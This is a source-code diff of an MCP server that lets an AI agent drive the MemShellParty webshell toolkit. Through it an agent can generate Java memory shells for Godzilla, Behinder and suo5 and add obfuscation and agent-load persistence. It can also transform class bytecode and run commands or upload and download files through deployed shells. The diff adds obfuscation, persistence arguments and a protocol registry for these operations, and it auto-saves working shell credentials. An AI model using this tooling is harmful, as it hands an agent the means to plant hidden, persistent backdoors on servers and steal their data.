@@ -4,25 +4,8 @@ import { writeFileSync } from "node:fs";
 import { z } from "zod";
 
 import { MemPartyClient } from "../api/client.js";
-import {
-  downloadBehinder,
-  execBehinder,
-  testBehinder,
-  uploadBehinder,
-} from "../connect/behinder.js";
-import {
-  downloadGodzilla,
-  execGodzilla,
-  testGodzilla,
-  uploadGodzilla,
-} from "../connect/godzilla.js";
-import { testSuo5 } from "../connect/suo5.js";
-import type {
-  ConnectTestResult,
-  DownloadResult,
-  ExecResult,
-  TransferResult,
-} from "../connect/types.js";
+import { requireProtocol, unsupportedMessage, type ProtocolOptions } from "../connect/registry.js";
+import type {} from "../connect/types.js";
 import { readUploadFile, resolveDownloadPath } from "../core/localfile.js";
 import { logOp, opLogPath, readOps, truncateOutput, type OpCategory } from "../core/oplog.js";
 import { emitSinglePackResult } from "../core/output.js";
@@ -39,6 +22,8 @@ import {
 } from "../core/targets.js";
 import { buildMemShellRequest } from "../core/request-builder.js";
 import { buildProbeRequest } from "../core/request-builder.js";
+import { parseObfuscationOptions } from "../core/obfuscation.js";
+import { agentLoadExamples, supportsAgentLoadArguments } from "../core/agent.js";
 import { CLI_VERSION } from "../version.js";
 
 function jsonContent(data: unknown) {
@@ -58,12 +43,15 @@ const memShellInput = {
   shellTool: z.string().describe("Shell tool, e.g. Godzilla, Behinder, Command"),
   shellType: z.string().describe("Shell type, e.g. Listener, Filter, Servlet"),
   packer: z.string().describe("Packer, e.g. Base64, Jar, JSP"),
-  jdk: z.string().optional().describe("java6/8/9/11/17/21 or class-file major version"),
+  jdk: z.string().optional().describe("java6/8/9/11/17/21/25 or class-file major version"),
   debug: z.boolean().optional(),
   byPassJavaModule: z.boolean().optional(),
   shrink: z.boolean().optional(),
   lambdaSuffix: z.boolean().optional(),
   probe: z.boolean().optional(),
+  obfuscate: z.boolean().optional(),
+  obfuscationOptions: z.string().optional().describe("obfuscation overrides: key=value, comma-separated"),
+  obfuscationScope: z.enum(["ALL", "MEMSHELL_INJECTOR", "INJECTOR", "MEMSHELL"]).optional(),
   shellClassName: z.string().optional(),
   godzillaPass: z.string().optional(),
   godzillaKey: z.string().optional(),
@@ -79,6 +67,7 @@ const memShellInput = {
   urlPattern: z.string().optional(),
   injectorClassName: z.string().optional(),
   staticInitialize: z.boolean().optional(),
+  agentArgs: z.string().optional().describe("Agent load-time arguments (persist=true / restore=true); not sent to the generate API"),
   outputFile: z
     .string()
     .optional()
@@ -91,14 +80,16 @@ const memShellInput = {
 };
 
 const probeInput = {
-  probeMethod: z.enum(["ResponseBody", "DNSLog", "Sleep"]),
-  probeContent: z.string().describe("BasicInfo, Server, OS, JDK, Bytecode, Command"),
+  probeMethod: z.enum(["ResponseBody", "ResponseHeader", "DNSLog", "Sleep"]),
+  probeContent: z.string().describe("Server, JDK, Bytecode, Command, ScriptEngine, Filter"),
   packer: z.string(),
   jdk: z.string().optional(),
   debug: z.boolean().optional(),
   byPassJavaModule: z.boolean().optional(),
   shrink: z.boolean().optional(),
   lambdaSuffix: z.boolean().optional(),
+  obfuscate: z.boolean().optional(),
+  obfuscationOptions: memShellInput.obfuscationOptions,
   staticInitialize: z.boolean().optional(),
   shellClassName: z.string().optional(),
   host: z.string().optional(),
@@ -107,7 +98,32 @@ const probeInput = {
   server: z.string().optional(),
   reqParamName: z.string().optional(),
   commandTemplate: z.string().optional(),
+  respHeaderName: z.string().optional(),
   outputFile: memShellInput.outputFile,
+};
+
+const bytecodeInput = {
+  classBytesBase64: z.string().describe("Base64 or GzipBase64 class bytes"),
+  outputFile: z.string().optional().describe("also write the transformed class to this local file"),
+};
+
+const bytecodeTransformInput = {
+  ...bytecodeInput,
+  packer: z.string().optional(),
+  byPassJavaModule: z.boolean().optional(),
+  staticInitialize: z.boolean().optional(),
+  shrink: z.boolean().optional(),
+  renamePackage: z.boolean().optional(),
+  relocateFrom: z.string().optional(),
+  relocateTo: z.string().optional(),
+  entryMethod: z.string().optional(),
+  newClassName: z.string().optional(),
+  randomName: z.boolean().optional(),
+  obfuscate: z.boolean().optional(),
+  obfuscationOptions: memShellInput.obfuscationOptions,
+  server: z.string().optional(),
+  probeMethod: z.enum(["ResponseBody", "ResponseHeader"]).optional(),
+  respHeaderName: z.string().optional(),
 };
 
 const connectInput = {
@@ -142,6 +158,7 @@ const connectInput = {
     .describe("suo5 protocol variant (default: auto)"),
   insecure: z.boolean().optional().describe("skip TLS certificate verification"),
   timeoutMs: z.number().optional().describe("request timeout in milliseconds (default 30000)"),
+  upgradeProtocol: z.string().optional().describe("Godzilla Upgrade: fully-qualified generated shell class name"),
 };
 
 const execInput = {
@@ -179,6 +196,7 @@ const execInput = {
     .describe("gate header value from generate_memshell shellToolConfig — required for MemShellParty shells"),
   insecure: z.boolean().optional().describe("skip TLS certificate verification"),
   timeoutMs: z.number().optional().describe("request timeout in milliseconds (default 30000)"),
+  upgradeProtocol: z.string().optional().describe("Godzilla Upgrade: fully-qualified generated shell class name"),
 };
 
 /** Connection fields shared by download_file / upload_file (no command/os). */
@@ -192,6 +210,7 @@ const transferConnInput = {
   headerValue: execInput.headerValue,
   insecure: execInput.insecure,
   timeoutMs: execInput.timeoutMs,
+  upgradeProtocol: execInput.upgradeProtocol,
   remoteCharset: z
     .string()
     .optional()
@@ -231,6 +250,7 @@ const targetSaveInput = {
   headerName: z.string().optional().describe("gate header name (shellToolConfig.headerName)"),
   headerValue: z.string().optional().describe("gate header value (shellToolConfig.headerValue)"),
   insecure: z.boolean().optional().describe("skip TLS certificate verification"),
+  upgradeProtocol: z.string().optional().describe("Godzilla Upgrade: fully-qualified generated shell class name"),
   projectRemark: z.string().optional().describe("project remark (merged into the project)"),
   projectCategory: z.string().optional().describe("project category (merged into the project)"),
   shellRemark: z.string().optional().describe("remark for this shell"),
@@ -238,6 +258,84 @@ const targetSaveInput = {
 
 export function createMcpServer(client: MemPartyClient): McpServer {
   const server = new McpServer({ name: "memshell-party", version: CLI_VERSION });
+
+  server.registerTool(
+    "bytecode_decode",
+    {
+      title: "Decode Java class",
+      description: "Decode Base64/GzipBase64 class bytes and return class metadata (MemShellParty v3+).",
+      inputSchema: bytecodeInput,
+    },
+    async (args) => {
+      try {
+        const result = await client.decodeBytecode(args.classBytesBase64);
+        const outputFile = args.outputFile === undefined
+          ? undefined
+          : emitSinglePackResult(
+              { packResult: result.classBytesBase64Str },
+              { outFile: args.outputFile, decode: true },
+            );
+        return jsonContent(outputFile === undefined ? result : { ...result, outputFile });
+      } catch (err) {
+        return errorContent(err);
+      }
+    },
+  );
+
+  server.registerTool(
+    "bytecode_transform",
+    {
+      title: "Transform Java class",
+      description: "Rename, relocate, instrument, obfuscate or pack a Java class (MemShellParty v3+).",
+      inputSchema: bytecodeTransformInput,
+    },
+    async (args) => {
+      try {
+        const renamePackage = args.renamePackage || args.relocateFrom !== undefined || args.relocateTo !== undefined;
+        if (renamePackage && (!args.relocateFrom || !args.relocateTo)) {
+          throw new Error("Package relocation requires relocateFrom and relocateTo.");
+        }
+        const {
+          outputFile: outputPath,
+          obfuscate: _obfuscate,
+          obfuscationOptions,
+          probeMethod,
+          server,
+          respHeaderName,
+          ...fields
+        } = args;
+        const request = {
+          obfuscation:
+            args.obfuscate || args.obfuscationOptions !== undefined
+              ? { enabled: true, options: parseObfuscationOptions(args.obfuscationOptions) }
+              : undefined,
+          ...(probeMethod === undefined ? {} : {
+            server: server ?? "Unknown",
+            probe: {
+              probeMethod,
+              probeContent: "Bytecode",
+              respHeaderName,
+            },
+          }),
+        };
+        const result = await client.transformBytecode({
+          classBytesBase64: args.classBytesBase64,
+          ...(Object.fromEntries(Object.entries(fields).filter(([, value]) => value !== undefined))),
+          ...(renamePackage ? { renamePackage } : {}),
+          ...request,
+        });
+        const outputFile = outputPath === undefined
+          ? undefined
+          : emitSinglePackResult(
+              { packResult: result.packResult ?? result.classBytesBase64Str },
+              { outFile: outputPath, decode: result.packResult === undefined || undefined },
+            );
+        return jsonContent(outputFile === undefined ? result : { ...result, outputFile });
+      } catch (err) {
+        return errorContent(err);
+      }
+    },
+  );
 
   server.registerTool(
     "list_servers",
@@ -294,6 +392,38 @@ export function createMcpServer(client: MemPartyClient): McpServer {
   );
 
   server.registerTool(
+    "list_shell_tool_configs",
+    {
+      title: "List shell tool configs",
+      description:
+        "List v3 shell tool parameter names, types, enum choices and groups. " +
+        "An empty list means the backend uses the legacy v2 API.",
+    },
+    async () => {
+      try {
+        return jsonContent(await client.getShellToolConfigs());
+      } catch (err) {
+        return errorContent(err);
+      }
+    },
+  );
+
+  server.registerTool(
+    "list_obfuscation_options",
+    {
+      title: "List obfuscation options",
+      description: "List class obfuscation option keys, defaults and valid values (v3+)",
+    },
+    async () => {
+      try {
+        return jsonContent(await client.getObfuscationOptions());
+      } catch (err) {
+        return errorContent(err);
+      }
+    },
+  );
+
+  server.registerTool(
     "generate_memshell",
     {
       title: "Generate memory shell",
@@ -314,7 +444,18 @@ export function createMcpServer(client: MemPartyClient): McpServer {
       };
       const started = Date.now();
       try {
-        const response = await client.generateMemShell(buildMemShellRequest(args));
+        if (args.agentArgs !== undefined && !supportsAgentLoadArguments(args.shellType, args.packer)) {
+          throw new Error(
+            "agentArgs requires an Agent* shell type " +
+              "and an AgentJar, AgentJarWithJDKAttacher, or AgentJarWithJREAttacher packer.",
+          );
+        }
+        const response = await client.generateMemShell(
+          buildMemShellRequest({
+            ...args,
+            obfuscationOptions: parseObfuscationOptions(args.obfuscationOptions),
+          }),
+        );
         const outputFile =
           args.outputFile !== undefined
             ? emitSinglePackResult(response, { outFile: args.outputFile })
@@ -327,7 +468,14 @@ export function createMcpServer(client: MemPartyClient): McpServer {
           detail: `${response.memShellResult.shellClassName} (${response.memShellResult.shellSize} bytes)`,
           meta,
         });
-        return jsonContent(outputFile === undefined ? response : { ...response, outputFile });
+        return jsonContent({
+          ...response,
+          ...(outputFile === undefined ? {} : { outputFile }),
+          ...(args.agentArgs === undefined ? {} : {
+            agentArgs: args.agentArgs,
+            agentLoadExamples: agentLoadExamples(args.agentArgs),
+          }),
+        });
       } catch (err) {
         logOp({
           category: "gen",
@@ -361,7 +509,12 @@ export function createMcpServer(client: MemPartyClient): McpServer {
       };
       const started = Date.now();
       try {
-        const response = await client.generateProbe(buildProbeRequest(args));
+        const response = await client.generateProbe(
+          buildProbeRequest({
+            ...args,
+            obfuscationOptions: parseObfuscationOptions(args.obfuscationOptions),
+          }),
+        );
         const outputFile =
           args.outputFile !== undefined
             ? emitSinglePackResult(response, { outFile: args.outputFile })
@@ -440,6 +593,7 @@ export function createMcpServer(client: MemPartyClient): McpServer {
           headerName: args.headerName,
           headerValue: args.headerValue,
           insecure: args.insecure,
+          upgradeProtocol: args.upgradeProtocol,
         });
         const common = {
           headerName: conn.headerName,
@@ -447,21 +601,10 @@ export function createMcpServer(client: MemPartyClient): McpServer {
           extraHeaders: conn.extraHeaders,
           timeoutMs: args.timeoutMs,
           insecure: conn.insecure,
+          upgradeProtocol: conn.upgradeProtocol,
         };
-        let result: ConnectTestResult;
-        switch (conn.tool) {
-          case "godzilla":
-            result = await testGodzilla(conn.url, conn.pass ?? "pass", conn.key ?? "key", common);
-            break;
-          case "behinder":
-            result = await testBehinder(conn.url, conn.pass ?? "rebeyond", common);
-            break;
-          case "suo5":
-            result = await testSuo5(conn.url, { ...common, mode: args.suo5Mode });
-            break;
-          default:
-            throw new Error(`unknown tool ${String(conn.tool)}`);
-        }
+        const options: ProtocolOptions = { suo5Mode: args.suo5Mode };
+        const result = await requireProtocol(conn.tool).test({ conn, common, options });
         // a successful handshake proves the credentials — keep them as a named target
         let savedAs: string | undefined;
         if (result.ok && conn.targetName === undefined) {
@@ -509,6 +652,7 @@ export function createMcpServer(client: MemPartyClient): McpServer {
           headerName: args.headerName,
           headerValue: args.headerValue,
           insecure: args.insecure,
+          upgradeProtocol: args.upgradeProtocol,
         });
         const common = {
           headerName: conn.headerName,
@@ -516,24 +660,11 @@ export function createMcpServer(client: MemPartyClient): McpServer {
           extraHeaders: conn.extraHeaders,
           timeoutMs: args.timeoutMs,
           insecure: conn.insecure,
+          upgradeProtocol: conn.upgradeProtocol,
         };
-        let result: ExecResult;
-        switch (conn.tool) {
-          case "godzilla":
-            result = await execGodzilla(
-              conn.url,
-              conn.pass ?? "pass",
-              conn.key ?? "key",
-              args.command,
-              { ...common, os: args.os },
-            );
-            break;
-          case "behinder":
-            result = await execBehinder(conn.url, conn.pass ?? "rebeyond", args.command, common);
-            break;
-          default:
-            throw new Error(`exec supports godzilla | behinder (got ${String(conn.tool)})`);
-        }
+        const protocol = requireProtocol(conn.tool);
+        if (!protocol.exec) throw new Error(unsupportedMessage(protocol, "exec"));
+        const result = await protocol.exec({ conn, common, options: { os: args.os } }, args.command);
         // a successful exec proves the credentials — keep them as a named target
         let savedAs: string | undefined;
         if (result.ok && conn.targetName === undefined) {
@@ -583,6 +714,7 @@ export function createMcpServer(client: MemPartyClient): McpServer {
           headerName: args.headerName,
           headerValue: args.headerValue,
           insecure: args.insecure,
+          upgradeProtocol: args.upgradeProtocol,
         });
         const common = {
           headerName: conn.headerName,
@@ -590,32 +722,17 @@ export function createMcpServer(client: MemPartyClient): McpServer {
           extraHeaders: conn.extraHeaders,
           timeoutMs: args.timeoutMs,
           insecure: conn.insecure,
+          upgradeProtocol: conn.upgradeProtocol,
         };
         // decide + validate the local destination before touching the network
         const localPath = resolveDownloadPath(args.remotePath, args.localPath, args.force ?? false);
 
-        let result: DownloadResult;
-        switch (conn.tool) {
-          case "godzilla":
-            result = await downloadGodzilla(
-              conn.url,
-              conn.pass ?? "pass",
-              conn.key ?? "key",
-              args.remotePath,
-              { ...common, remoteCharset: args.remoteCharset },
-            );
-            break;
-          case "behinder":
-            result = await downloadBehinder(
-              conn.url,
-              conn.pass ?? "rebeyond",
-              args.remotePath,
-              common,
-            );
-            break;
-          default:
-            throw new Error(`download supports godzilla | behinder (got ${String(conn.tool)})`);
-        }
+        const protocol = requireProtocol(conn.tool);
+        if (!protocol.download) throw new Error(unsupportedMessage(protocol, "download"));
+        let result = await protocol.download(
+          { conn, common, options: { remoteCharset: args.remoteCharset } },
+          args.remotePath,
+        );
         if (result.ok && result.data !== undefined) {
           try {
             writeFileSync(localPath, result.data);
@@ -676,6 +793,7 @@ export function createMcpServer(client: MemPartyClient): McpServer {
           headerName: args.headerName,
           headerValue: args.headerValue,
           insecure: args.insecure,
+          upgradeProtocol: args.upgradeProtocol,
         });
         const common = {
           headerName: conn.headerName,
@@ -683,34 +801,18 @@ export function createMcpServer(client: MemPartyClient): McpServer {
           extraHeaders: conn.extraHeaders,
           timeoutMs: args.timeoutMs,
           insecure: conn.insecure,
+          upgradeProtocol: conn.upgradeProtocol,
         };
         // read + validate the local file before touching the network
         const data = readUploadFile(args.localPath);
 
-        let result: TransferResult;
-        switch (conn.tool) {
-          case "godzilla":
-            result = await uploadGodzilla(
-              conn.url,
-              conn.pass ?? "pass",
-              conn.key ?? "key",
-              args.remotePath,
-              data,
-              { ...common, remoteCharset: args.remoteCharset },
-            );
-            break;
-          case "behinder":
-            result = await uploadBehinder(
-              conn.url,
-              conn.pass ?? "rebeyond",
-              args.remotePath,
-              data,
-              common,
-            );
-            break;
-          default:
-            throw new Error(`upload supports godzilla | behinder (got ${String(conn.tool)})`);
-        }
+        const protocol = requireProtocol(conn.tool);
+        if (!protocol.upload) throw new Error(unsupportedMessage(protocol, "upload"));
+        const result = await protocol.upload(
+          { conn, common, options: { remoteCharset: args.remoteCharset } },
+          args.remotePath,
+          data,
+        );
         let savedAs: string | undefined;
         if (result.ok && conn.targetName === undefined) {
           savedAs = autoSaveShell(conn);
@@ -763,6 +865,7 @@ export function createMcpServer(client: MemPartyClient): McpServer {
           headerName: args.headerName,
           headerValue: args.headerValue,
           insecure: args.insecure,
+          upgradeProtocol: args.upgradeProtocol,
           remark: args.shellRemark,
         });
         logOp({
